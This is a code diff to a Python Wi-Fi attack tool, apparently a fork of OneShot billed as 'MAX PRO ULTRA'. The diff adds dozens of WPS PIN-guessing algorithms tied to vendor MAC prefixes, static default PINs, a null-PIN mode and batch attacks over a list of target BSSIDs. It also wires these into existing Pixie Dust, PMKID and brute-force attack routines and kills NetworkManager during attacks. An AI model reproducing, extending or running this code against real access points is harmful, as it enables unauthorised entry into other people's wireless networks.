@@ -65,16 +65,22 @@ def clr(text, *styles):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  MAC ADDRESS HELPER
+#  MAC ADDRESS HELPER  (Fix #4: validation added)
 # ═══════════════════════════════════════════════════════════════════
+MAC_RE = re.compile(r'^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$')
+
+
 class NetworkAddress:
     def __init__(self, mac):
         if isinstance(mac, int):
+            if mac < 0 or mac > 0xFFFFFFFFFFFF:
+                raise ValueError(f'MAC integer out of range: {mac}')
             self._int_repr = mac
             self._str_repr = self._int2mac(mac)
         elif isinstance(mac, str):
-            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
-            self._int_repr = self._mac2int(mac)
+            mac_clean = mac.replace('-', ':').replace('.', ':').upper()
+            self._int_repr = self._mac2int(mac_clean)
+            self._str_repr = self._int2mac(self._int_repr)
         else:
             raise ValueError('MAC address must be string or integer')
 
@@ -84,8 +90,8 @@ class NetworkAddress:
 
     @string.setter
     def string(self, value):
-        self._str_repr = value
         self._int_repr = self._mac2int(value)
+        self._str_repr = self._int2mac(self._int_repr)
 
     @property
     def integer(self):
@@ -93,6 +99,8 @@ class NetworkAddress:
 
     @integer.setter
     def integer(self, value):
+        if value < 0 or value > 0xFFFFFFFFFFFF:
+            raise ValueError(f'MAC integer out of range: {value}')
         self._int_repr = value
         self._str_repr = self._int2mac(value)
 
@@ -103,11 +111,11 @@ class NetworkAddress:
         return self.string
 
     def __iadd__(self, other):
-        self.integer += other
+        self.integer = self.integer + other
         return self
 
     def __isub__(self, other):
-        self.integer -= other
+        self.integer = self.integer - other
         return self
 
     def __eq__(self, other):
@@ -127,7 +135,18 @@ class NetworkAddress:
 
     @staticmethod
     def _mac2int(mac):
-        return int(mac.replace(':', ''), 16)
+        # Validate strict 12-hex-digit form
+        clean = mac.replace(':', '').replace('-', '').replace('.', '')
+        if len(clean) != 12:
+            raise ValueError(
+                f'Invalid MAC address (expected 12 hex digits): {mac}')
+        try:
+            value = int(clean, 16)
+        except ValueError:
+            raise ValueError(f'Invalid MAC address (non-hex chars): {mac}')
+        if value < 0 or value > 0xFFFFFFFFFFFF:
+            raise ValueError(f'Invalid MAC address value: {mac}')
+        return value
 
     @staticmethod
     def _int2mac(mac):
@@ -175,7 +194,6 @@ def truncate(s, length, postfix='…'):
 # ═══════════════════════════════════════════════════════════════════
 #  DEPENDENCY CHECK — SILENT BACKGROUND MODE
 # ═══════════════════════════════════════════════════════════════════
-# Global silent registry — populated by check_dependencies()
 _OPTIONAL_TOOLS = {
     'hcxdumptool':   False,
     'hcxpcapngtool': False,
@@ -185,12 +203,6 @@ _OPTIONAL_TOOLS = {
 
 
 def check_dependencies():
-    """Verify required tools.
-
-    Required tools → missing হলে die() হবে (error দেখাবে)।
-    Optional tools → silent background check, কোনো display output নেই।
-                     থাকলে কাজ করবে, না থাকলে চুপচাপ skip।
-    """
     global _OPTIONAL_TOOLS
 
     required = {
@@ -216,8 +228,6 @@ def check_dependencies():
             '\nInstall: apt install ' + ' '.join(
                 p.split('(')[1].strip(')') for p in missing))
 
-    # ── Optional tools: SILENT background check ──
-    # কোনো print() নেই। Result গুলো global dict-এ save হয়।
     for cmd in optional:
         _OPTIONAL_TOOLS[cmd] = shutil.which(cmd) is not None
 
@@ -232,6 +242,7 @@ class WPSpin:
         self.ALGO_STATIC = 2
 
         self.algos = {
+            # ── Basic MAC-derived ──
             'pin24':       {'name': '24-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin24},
             'pin28':       {'name': '28-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin28},
             'pin32':       {'name': '32-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin32},
@@ -239,7 +250,43 @@ class WPSpin:
             'pinDLink1':   {'name': 'D-Link PIN +1',    'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
             'pinASUS':     {'name': 'ASUS PIN',         'mode': self.ALGO_MAC,    'gen': self.pinASUS},
             'pinAirocon':  {'name': 'Airocon Realtek',  'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
+            'pinBelkin':   {'name': 'Belkin (Stas\'M)', 'mode': self.ALGO_MAC,    'gen': self.pinBelkin},
+            'pinArcadyan': {'name': 'Arcadyan',         'mode': self.ALGO_MAC,    'gen': self.pinArcadyan},
+            'pinZhao':     {'name': 'Zhao Chesung',     'mode': self.ALGO_MAC,    'gen': self.pinZhao},
+            'pinTrendNet': {'name': 'TrendNet',         'mode': self.ALGO_MAC,    'gen': self.pinTrendNet},
 
+            # ── Extended MAC widths ──
+            'pin36':       {'name': '36-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin36},
+            'pin40':       {'name': '40-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin40},
+            'pin44':       {'name': '44-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin44},
+            'pin48':       {'name': '48-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin48},
+
+            # ── Reverse byte ──
+            'pin24rh':     {'name': 'Rev-Byte 24-bit',  'mode': self.ALGO_MAC,    'gen': self.pin24rh},
+            'pin32rh':     {'name': 'Rev-Byte 32-bit',  'mode': self.ALGO_MAC,    'gen': self.pin32rh},
+            'pin48rh':     {'name': 'Rev-Byte 48-bit',  'mode': self.ALGO_MAC,    'gen': self.pin48rh},
+
+            # ── Reverse nibble ──
+            'pin24rn':     {'name': 'Rev-Nibble 24-bit','mode': self.ALGO_MAC,    'gen': self.pin24rn},
+            'pin32rn':     {'name': 'Rev-Nibble 32-bit','mode': self.ALGO_MAC,    'gen': self.pin32rn},
+            'pin48rn':     {'name': 'Rev-Nibble 48-bit','mode': self.ALGO_MAC,    'gen': self.pin48rn},
+
+            # ── Reverse bits ──
+            'pin24rb':     {'name': 'Rev-Bits 24-bit',  'mode': self.ALGO_MAC,    'gen': self.pin24rb},
+            'pin32rb':     {'name': 'Rev-Bits 32-bit',  'mode': self.ALGO_MAC,    'gen': self.pin32rb},
+            'pin48rb':     {'name': 'Rev-Bits 48-bit',  'mode': self.ALGO_MAC,    'gen': self.pin48rb},
+
+            # ── NIC arithmetic ──
+            'pinInvNIC':   {'name': 'INV NIC',          'mode': self.ALGO_MAC,    'gen': self.pinInvNIC},
+            'pinNICx2':    {'name': 'NIC × 2',          'mode': self.ALGO_MAC,    'gen': self.pinNICx2},
+            'pinNICx3':    {'name': 'NIC × 3',          'mode': self.ALGO_MAC,    'gen': self.pinNICx3},
+
+            # ── OUI/NIC operations ──
+            'pinOUIaddNIC': {'name': 'OUI + NIC',       'mode': self.ALGO_MAC,    'gen': self.pinOUIaddNIC},
+            'pinOUIsubNIC': {'name': 'OUI − NIC',       'mode': self.ALGO_MAC,    'gen': self.pinOUIsubNIC},
+            'pinOUIxorNIC': {'name': 'OUI ⊕ NIC',       'mode': self.ALGO_MAC,    'gen': self.pinOUIxorNIC},
+
+            # ── Empty + static pins ──
             'pinEmpty':    {'name': 'Empty PIN',        'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
             'pinCisco':    {'name': 'Cisco',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
             'pinBrcm1':    {'name': 'Broadcom 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
@@ -263,7 +310,6 @@ class WPSpin:
             'pinHG532x':   {'name': 'HG532x',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
             'pinH108L':    {'name': 'H108L',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
             'pinONO':      {'name': 'CBN ONO',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
-
             'pin2Wire':    {'name': '2Wire (CVE-2012-4366)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1223330},
             'pinArris':    {'name': 'Arris (Advisory)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 8822885},
         }
@@ -459,13 +505,42 @@ class WPSpin:
             'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5',
                          'C864C7', 'DC028E', 'FCC897'),
             'pinONO': ('5C353B', 'DC537C'),
+            'pinBelkin':  ('001CDF', '002275', '08863B', '00B00C', '081075',
+                           '94103E', '944452', 'B4750E', 'C05627', 'EC1A59'),
+            'pinArcadyan': ('001A2B', '00248C', '002618', '344DEB', '7071BC',
+                            'E06995', 'E0CB4E', '7054F5', 'D46E5C'),
+            'pinZhao':    ('C83A35', '00B00C', '081075', '001CDF', '002275',
+                           '08863B'),
+            'pinTrendNet': ('0014D1', '000C42', '000EE8', '00E04C'),
+            'pin36':  (),
+            'pin40':  (),
+            'pin44':  (),
+            'pin48':  (),
+            'pin24rh': (),
+            'pin32rh': (),
+            'pin48rh': (),
+            'pin24rn': (),
+            'pin32rn': (),
+            'pin48rn': (),
+            'pin24rb': (),
+            'pin32rb': (),
+            'pin48rb': (),
+            'pinInvNIC': (),
+            'pinNICx2': (),
+            'pinNICx3': (),
+            'pinOUIaddNIC': (),
+            'pinOUIsubNIC': (),
+            'pinOUIxorNIC': (),
         }
         res = []
         for algo_id, masks in algorithms.items():
+            if not masks:
+                continue
             if mac.startswith(masks):
                 res.append(algo_id)
         return res
 
+    # ── Basic MAC-derived algorithms ──
     def pin24(self, mac):
         return mac.integer & 0xFFFFFF
 
@@ -489,7 +564,7 @@ class WPSpin:
         return pin
 
     def pinDLink1(self, mac):
-        mac.integer += 1
+        mac.integer = mac.integer + 1
         return self.pinDLink(mac)
 
     def pinASUS(self, mac):
@@ -509,6 +584,127 @@ class WPSpin:
              + (((b[2] + b[3]) % 10) * 10000) \
              + (((b[1] + b[2]) % 10) * 100000) \
              + (((b[0] + b[1]) % 10) * 1000000)
+
+    def pinBelkin(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        pin = nic ^ 0x55AA55
+        pin ^= (((pin & 0xF) << 4) +
+                ((pin & 0xF) << 8) +
+                ((pin & 0xF) << 12) +
+                ((pin & 0xF) << 16) +
+                ((pin & 0xF) << 20))
+        pin %= int(10e6)
+        if pin < int(10e5):
+            pin += ((pin % 9) * int(10e5)) + int(10e5)
+        return pin
+
+    def pinArcadyan(self, mac):
+        b = [int(i, 16) for i in mac.string.split(':')]
+        return ((b[0] + b[1]) % 10) \
+             + (((b[5] + b[0]) % 10) * 10) \
+             + (((b[4] + b[5]) % 10) * 100) \
+             + (((b[3] + b[4]) % 10) * 1000) \
+             + (((b[2] + b[3]) % 10) * 10000) \
+             + (((b[1] + b[2]) % 10) * 100000) \
+             + (((b[0] + b[1]) % 10) * 1000000)
+
+    def pinZhao(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return nic % 10000000
+
+    def pinTrendNet(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return nic % 10000000
+
+    # ── Extended MAC widths ──
+    def pin36(self, mac):
+        return mac.integer & 0xFFFFFFFFF
+
+    def pin40(self, mac):
+        return mac.integer & 0xFFFFFFFFFF
+
+    def pin44(self, mac):
+        return mac.integer & 0xFFFFFFFFFFF
+
+    def pin48(self, mac):
+        return mac.integer & 0xFFFFFFFFFFFF
+
+    # ── Reverse byte ──
+    def pin24rh(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        result = 0
+        for i in range(3):
+            byte = (nic >> (i * 8)) & 0xFF
+            result |= byte << ((2 - i) * 8)
+        return result
+
+    def pin32rh(self, mac):
+        val = mac.integer & 0xFFFFFFFF
+        result = 0
+        for i in range(4):
+            byte = (val >> (i * 8)) & 0xFF
+            result |= byte << ((3 - i) * 8)
+        return result
+
+    def pin48rh(self, mac):
+        result = 0
+        for i in range(6):
+            byte = (mac.integer >> (i * 8)) & 0xFF
+            result |= byte << ((5 - i) * 8)
+        return result
+
+    # ── Reverse nibble ──
+    def pin24rn(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        s = f'{nic:06X}'
+        return int(s[::-1], 16)
+
+    def pin32rn(self, mac):
+        val = mac.integer & 0xFFFFFFFF
+        s = f'{val:08X}'
+        return int(s[::-1], 16)
+
+    def pin48rn(self, mac):
+        s = f'{mac.integer:012X}'
+        return int(s[::-1], 16)
+
+    # ── Reverse bits ──
+    def pin24rb(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return int(f'{nic:024b}'[::-1], 2)
+
+    def pin32rb(self, mac):
+        val = mac.integer & 0xFFFFFFFF
+        return int(f'{val:032b}'[::-1], 2)
+
+    def pin48rb(self, mac):
+        return int(f'{mac.integer:048b}'[::-1], 2)
+
+    # ── NIC arithmetic ──
+    def pinInvNIC(self, mac):
+        return (~mac.integer) & 0xFFFFFF
+
+    def pinNICx2(self, mac):
+        return (mac.integer & 0xFFFFFF) * 2
+
+    def pinNICx3(self, mac):
+        return (mac.integer & 0xFFFFFF) * 3
+
+    # ── OUI/NIC operations ──
+    def pinOUIaddNIC(self, mac):
+        oui = mac.integer >> 24
+        nic = mac.integer & 0xFFFFFF
+        return (oui + nic) & 0xFFFFFF
+
+    def pinOUIsubNIC(self, mac):
+        oui = mac.integer >> 24
+        nic = mac.integer & 0xFFFFFF
+        return (oui - nic) & 0xFFFFFF
+
+    def pinOUIxorNIC(self, mac):
+        oui = mac.integer >> 24
+        nic = mac.integer & 0xFFFFFF
+        return oui ^ nic
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -567,12 +763,24 @@ class BruteforceStatus:
         self.counter = 0
         self.statistics_period = 5
 
+    # ── Fix #2: mask length/format check ──
     def display_status(self):
-        average_pin_time = statistics.mean(self.attempts_times)
-        if len(self.mask) == 4:
-            percentage = int(self.mask) / 11000 * 100
-        else:
-            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
+        if not self.attempts_times:
+            return
+        try:
+            average_pin_time = statistics.mean(self.attempts_times)
+        except statistics.StatisticsError:
+            return
+        try:
+            if len(self.mask) == 4:
+                percentage = int(self.mask) / 11000 * 100
+            elif len(self.mask) == 7:
+                percentage = ((10000 / 11000) +
+                              (int(self.mask[4:]) / 11000)) * 100
+            else:
+                return
+        except (ValueError, IndexError):
+            return
         print(f'{C.B_CYAN}[*]{C.RESET} {C.B_WHITE}{percentage:.2f}%{C.RESET} '
               f'complete @ {C.GOLD}{self.start_time}{C.RESET} '
               f'({C.YELLOW}{average_pin_time:.2f}s/pin{C.RESET})')
@@ -605,6 +813,7 @@ class Companion:
         self.loop_mode = False
         self._fail_count = 0
         self._watchdog_stop = None
+        self._killed_processes = []
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -852,7 +1061,6 @@ class Companion:
         return False
 
     def pmkid_attack(self, bssid, timeout=60):
-        # Silent background check — no startup warning
         if not _OPTIONAL_TOOLS.get('hcxdumptool', False):
             print(f'{C.B_YELLOW}[!]{C.RESET} hcxdumptool not available '
                   f'— PMKID attack skipped')
@@ -1035,7 +1243,9 @@ class Companion:
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False,
                           pbc_mode=False, showpixiecmd=False, pixieforce=False,
-                          store_pin_on_fail=False):
+                          store_pin_on_fail=False, null_pin=False):
+        if null_pin:
+            pin = '00000000'
         if not pin:
             if pixiemode:
                 try:
@@ -1165,6 +1375,78 @@ class Companion:
             print(f'{C.B_CYAN}[i]{C.RESET} Session saved in {C.GOLD}{filename}{C.RESET}')
             if self.loop_mode:
                 raise
+
+    # ── Fix #3: systemd-aware kill/restore ──
+    def kill_interfering_processes(self):
+        interferers = ['NetworkManager', 'dhclient', 'dhcpcd']
+        for proc in interferers:
+            try:
+                # Detect if it's a systemd service
+                is_service = False
+                try:
+                    is_service = subprocess.run(
+                        ['systemctl', 'is-active', '--quiet', f'{proc}.service'],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                        timeout=3
+                    ).returncode == 0
+                except (FileNotFoundError, subprocess.TimeoutExpired):
+                    is_service = False
+
+                result = subprocess.run(['pgrep', '-x', proc],
+                                        capture_output=True, text=True,
+                                        timeout=5)
+                if result.returncode == 0:
+                    pids = [p for p in result.stdout.strip().split('\n')
+                            if p.strip()]
+                    for pid in pids:
+                        subprocess.run(['kill', '-9', pid],
+                                       stdout=subprocess.DEVNULL,
+                                       stderr=subprocess.DEVNULL)
+                    self._killed_processes.append({
+                        'name': proc,
+                        'service': is_service,
+                        'pids': pids,
+                    })
+                    print(f'{C.B_YELLOW}[!]{C.RESET} Killed {proc} '
+                          f'(PID: {", ".join(pids)})'
+                          + ('  [systemd service]' if is_service else ''))
+            except Exception as e:
+                print(f'{C.B_YELLOW}[!]{C.RESET} Kill {proc} failed: {e}')
+
+    def restore_processes(self):
+        if not self._killed_processes:
+            return
+        print(f'{C.B_CYAN}[*]{C.RESET} Restoring killed processes…')
+        for entry in self._killed_processes:
+            name = entry['name']
+            try:
+                if entry['service']:
+                    rc = subprocess.run(
+                        ['systemctl', 'start', f'{name}.service'],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                        timeout=10
+                    ).returncode
+                    if rc == 0:
+                        print(f'{C.B_GREEN}[+]{C.RESET} Restarted '
+                              f'{name} via systemctl')
+                    else:
+                        print(f'{C.B_YELLOW}[!]{C.RESET} systemctl could not '
+                              f'start {name} — run manually: '
+                              f'sudo systemctl start {name}')
+                else:
+                    if shutil.which(name):
+                        subprocess.Popen(
+                            [name],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            start_new_session=True)
+                        print(f'{C.B_GREEN}[+]{C.RESET} Restarted {name} binary')
+                    else:
+                        print(f'{C.B_YELLOW}[!]{C.RESET} {name} binary not '
+                              f'found — restore skipped')
+            except Exception as e:
+                print(f'{C.B_YELLOW}[!]{C.RESET} Restore {name} failed: {e}')
+        self._killed_processes.clear()
 
     def cleanup(self):
         try:
@@ -1322,16 +1604,16 @@ class WiFiScanner:
         if not networks:
             return False
 
-        # ═══════════════════════════════════════════════════════════
-        #  FILTER: শুধু WPS ON নেটওয়ার্কগুলো দেখাবে
-        #  WPS OFF / WPS IE absent সব বাদ যাবে
-        # ═══════════════════════════════════════════════════════════
+        # ── Fix #5: track total BEFORE filtering ──
+        total_scanned = len(networks)
+
+        # ── FILTER: শুধু WPS ON নেটওয়ার্ক দেখাবে ──
         networks = [n for n in networks if n['WPS']]
         if not networks:
-            print(f'{C.B_YELLOW}[!]{C.RESET} No WPS-enabled networks found.')
+            print(f'{C.B_YELLOW}[!]{C.RESET} No WPS-enabled networks found '
+                  f'(scanned {total_scanned} total).')
             return False
 
-        # সব WPS ON, তাই signal অনুযায়ী sort
         networks.sort(key=lambda n: n['Level'], reverse=True)
         network_list = {(i + 1): n for i, n in enumerate(networks)}
 
@@ -1345,7 +1627,9 @@ class WiFiScanner:
         print(f'{C.B_CYAN}║{C.RESET}{" " * pad}{C.B_WHITE}{C.BOLD}{title}{C.RESET}'
               f'{" " * (W - pad - _str_width(title))}{C.B_CYAN}║{C.RESET}')
         print(f'{C.B_CYAN}╠{"═" * W}╣{C.RESET}')
-        summary = f'  WPS ON: {wps_on_count}  |  Total: {wps_on_count}'
+        summary = (f'  WPS ON: {wps_on_count}  |  '
+                   f'Scanned: {total_scanned}  |  '
+                   f'Filtered out: {total_scanned - wps_on_count}')
         print(f'{C.B_CYAN}║{C.RESET}{C.GRAY}{summary}{C.RESET}'
               f'{" " * (W - _str_width(summary))}{C.B_CYAN}║{C.RESET}')
         print(f'{C.B_CYAN}╚{"═" * W}╝{C.RESET}')
@@ -1419,26 +1703,33 @@ class WiFiScanner:
         return (codecs.decode(d, 'unicode-escape')
                 .encode('latin1').decode('utf-8', errors='replace'))
 
+    # ── Fix #1: recursion removed, loop-based prompt ──
     def prompt_network(self) -> str:
-        networks = self.iw_scanner()
-        if not networks:
-            print(f'{C.B_RED}[-]{C.RESET} No networks found.')
-            return ''
         while True:
-            try:
-                networkNo = input(
-                    f'\n{C.GOLD}┌─[{C.RESET}{C.GOLD}{C.BOLD}Select Target{C.RESET}'
-                    f'{C.GOLD}]{C.RESET}\n'
-                    f'{C.GOLD}└─▶{C.RESET} '
-                    f'{C.DARKGRAY}(Enter to refresh){C.RESET}: '
-                )
-                if networkNo.lower() in ('r', '0', ''):
-                    return self.prompt_network()
-                if int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
-                raise IndexError
-            except Exception:
-                print(f'{C.B_RED}[!]{C.RESET} Invalid number')
+            networks = self.iw_scanner()
+            if not networks:
+                print(f'{C.B_RED}[-]{C.RESET} No networks found.')
+                return ''
+            rescan = False
+            while True:
+                try:
+                    networkNo = input(
+                        f'\n{C.GOLD}┌─[{C.RESET}{C.GOLD}{C.BOLD}Select Target{C.RESET}'
+                        f'{C.GOLD}]{C.RESET}\n'
+                        f'{C.GOLD}└─▶{C.RESET} '
+                        f'{C.DARKGRAY}(Enter to refresh){C.RESET}: '
+                    )
+                    if networkNo.lower() in ('r', '0', ''):
+                        rescan = True
+                        break
+                    if int(networkNo) in networks.keys():
+                        return networks[int(networkNo)]['BSSID']
+                    raise IndexError
+                except Exception:
+                    print(f'{C.B_RED}[!]{C.RESET} Invalid number')
+            if rescan:
+                continue
+            return ''
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -1478,7 +1769,7 @@ def show_banner():
     info_rows = [
         ('Author     ', 'NOYON BHAI',                C.B_GREEN),
         ('Based on   ', 'NOYON BHAI (OneShotPin)',   C.WHITE),
-        ('Version    ', 'MAX PRO ULTRA',             C.B_YELLOW),
+        ('Version    ', 'MAX PRO ULTRA v3.1',        C.B_YELLOW),
     ]
     for label, value, valcolor in info_rows:
         visible = 2 + 11 + 2 + _str_width(value)
@@ -1502,6 +1793,8 @@ if __name__ == '__main__':
                         help='Name of the interface to use')
     parser.add_argument('-b', '--bssid', type=str, help='BSSID of the target AP')
     parser.add_argument('-p', '--pin', type=str, help='Use the specified pin')
+    parser.add_argument('-N', '--null-pin', action='store_true',
+                        help='Use a null PIN (00000000)')
     parser.add_argument('-K', '--pixie-dust', action='store_true',
                         help='Run Pixie Dust attack')
     parser.add_argument('-F', '--pixie-force', action='store_true',
@@ -1534,12 +1827,23 @@ if __name__ == '__main__':
                         help='Skip dependency check')
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='Verbose output')
+    parser.add_argument('--kill', action='store_true',
+                        help='Kill interfering processes (NetworkManager, etc.)')
+    parser.add_argument('--restore', action='store_true',
+                        help='Restore killed processes on exit')
+    parser.add_argument('--bssid-list', type=str,
+                        help='File containing list of BSSIDs for batch mode')
     args = parser.parse_args()
 
     if sys.hexversion < 0x03060F0:
         die('The program requires Python 3.6 and above')
     if os.getuid() != 0:
         die('Run it as root')
+
+    # ── Fix #4: MAC validation on CLI input ──
+    if args.bssid and not MAC_RE.match(args.bssid):
+        die(f'Invalid BSSID format: "{args.bssid}" '
+            f'(expected AA:BB:CC:DD:EE:FF)')
 
     if not args.no_dep_check:
         check_dependencies()
@@ -1564,10 +1868,13 @@ if __name__ == '__main__':
                                   bssid=args.bssid or '')
             companion.loop_mode = args.loop
 
+            if args.kill:
+                companion.kill_interfering_processes()
+
             if args.pbc:
                 companion.single_connection(pbc_mode=True)
             else:
-                if not args.bssid:
+                if not args.bssid and not args.bssid_list:
                     try:
                         with open(args.vuln_list, 'r', encoding='utf-8') as f:
                             vuln_list = f.read().splitlines()
@@ -1580,18 +1887,46 @@ if __name__ == '__main__':
                               f'({C.GOLD}--bssid{C.RESET}) — '
                               f'scanning for available networks')
                     args.bssid = scanner.prompt_network()
+                    # Validate scanner-returned BSSID
+                    if args.bssid and not MAC_RE.match(args.bssid):
+                        die(f'Invalid BSSID from scanner: {args.bssid}')
 
-                if args.bssid:
+                if args.bssid_list:
+                    try:
+                        with open(args.bssid_list, 'r') as f:
+                            bssids = [line.strip() for line in f
+                                      if line.strip()]
+                    except FileNotFoundError:
+                        die(f'BSSID list file not found: {args.bssid_list}')
+                    # Validate all BSSIDs first
+                    invalid = [b for b in bssids if not MAC_RE.match(b)]
+                    if invalid:
+                        die(f'Invalid BSSIDs in list file: '
+                            f'{", ".join(invalid[:5])}'
+                            + (' …' if len(invalid) > 5 else ''))
+                    for b in bssids:
+                        companion.bssid = b
+                        if args.pmkid:
+                            companion.pmkid_attack(b)
+                        elif args.bruteforce:
+                            companion.smart_bruteforce(b, args.pin, args.delay)
+                        else:
+                            companion.single_connection(
+                                b, args.pin, args.pixie_dust, args.pbc,
+                                args.show_pixie_cmd, args.pixie_force,
+                                null_pin=args.null_pin)
+                elif args.bssid:
                     companion.bssid = args.bssid
                     if args.pmkid:
                         companion.pmkid_attack(args.bssid)
                     elif args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                     else:
-                        companion.single_connection(args.bssid, args.pin,
-                                                    args.pixie_dust, args.pbc,
-                                                    args.show_pixie_cmd,
-                                                    args.pixie_force)
+                        companion.single_connection(
+                            args.bssid, args.pin,
+                            args.pixie_dust, args.pbc,
+                            args.show_pixie_cmd, args.pixie_force,
+                            null_pin=args.null_pin)
             if not args.loop:
                 break
             try:
@@ -1611,6 +1946,8 @@ if __name__ == '__main__':
                 break
 
     if companion is not None:
+        if args.restore:
+            companion.restore_processes()
         try:
             companion.cleanup()
         except Exception:
